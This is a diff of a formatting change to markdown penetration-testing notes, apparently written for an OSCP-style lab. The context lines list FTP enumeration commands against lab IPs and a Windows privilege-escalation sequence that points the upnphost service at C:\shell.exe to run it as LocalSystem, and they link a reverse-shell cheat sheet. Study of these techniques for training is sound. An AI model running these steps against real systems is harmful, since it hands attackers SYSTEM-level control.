@@ -14,7 +14,7 @@ netcat/telnet interaction \
 nmap NSE FTP scripts \
 dotdotpwn 
 
-Commands:
+Commands: \
 https://www.serv-u.com/features/file-transfer-protocol-server-linux/commands \
 _nc 10.11.1.X 21_ \
 _nmap -v 10.11.1.X --script “ftp*”_ \
@@ -189,9 +189,8 @@ WinPrivChk: https://github.com/pentestmonkey/windows-privesc-check
 *net start UPNPHOST*\
 *sc config upnphost binpath= “C:\shell.exe”*\
 *sc config upnphost obj= “.\LocalSystem” password= “”*\
-*net start upnphost*
-\
-\
+*net start upnphost*\
+
 # Linux Post-Exploitation
 
 Shell Cheatsheet: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 
